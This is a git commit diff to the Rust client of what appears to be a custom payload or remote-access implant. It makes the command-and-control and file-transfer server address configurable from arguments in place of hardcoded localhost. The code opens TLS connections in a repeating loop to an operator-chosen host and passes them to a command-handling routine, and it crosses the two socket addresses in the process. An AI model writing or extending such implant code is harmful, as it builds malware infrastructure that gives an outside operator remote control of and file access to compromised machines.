3e1b6402fdc033c7f10b55a29971391999bad027
otitoko <tbkopera@proton.me>
2024-04-26 07:17:26 +0200

    this isnt nice, like in a function. will do eventually

--- payload/client/src/main.rs
+++ payload/client/src/main.rs
@@ -3,11 +3,29 @@ mod ssl_builder;
 mod connection;
 mod make_dir;
 
-use std::net::TcpStream;
+use std::net::{TcpStream,SocketAddr, Ipv4Addr, IpAddr};
 use std::process::Command;
 use std::process::exit;
+use std::env::args;
+
 
 fn main() {
+
+    let args: Vec<String> = args().collect();
+    let items: u8 = args.len().try_into().unwrap();
+
+    let ip_addr_1: u8 = args[1].parse().expect("Args must be a valid u8");
+    let ip_addr_2: u8 = args[2].parse().expect("Args must be a valid u8");
+    let ip_addr_3: u8 = args[3].parse().expect("Args must be a valid u8");
+    let ip_addr_4: u8 = args[4].parse().expect("Args must be a valid u8");
+    let fs_port: u16 = args[5].parse().expect("Args must be a valid u16");
+    let cc_port: u16 = args[6].parse().expect("Args must be a valid u16");
+
+    let ip_addr = IpAddr::V4(Ipv4Addr::new(ip_addr_1,ip_addr_2, ip_addr_3, ip_addr_4));
+    let fs_sock_addr = SocketAddr::new(ip_addr,fs_port);
+    let cc_sock_addr = SocketAddr::new(ip_addr,cc_port);
+
+
 
     let code = make_dir::make_dir();
     match code {
@@ -23,11 +41,12 @@ fn main() {
     loop {
     
         let connector = ssl_builder::ssl_builder();
-        
-        if let Ok(stream_cc) = TcpStream::connect("127.0.0.1:7878") {
-            if let Ok(stream_fs) = TcpStream::connect("127.0.0.1:7870") {
-                let stream_cc = connector.connect("127.0.0.1",stream_cc).unwrap();
-                let stream_fs = connector.connect("127.0.0.1",stream_fs).unwrap();
+
+
+        if let Ok(stream_cc) = TcpStream::connect(fs_sock_addr) {
+            if let Ok(stream_fs) = TcpStream::connect(cc_sock_addr) {
+                let stream_cc = connector.connect(ip_addr.to_string().as_str(),stream_cc).unwrap();
+                let stream_fs = connector.connect(ip_addr.to_string().as_str(),stream_fs).unwrap();
                 connection::flow(stream_cc, stream_fs, number_of_order);
 
                 number_of_order += 1;
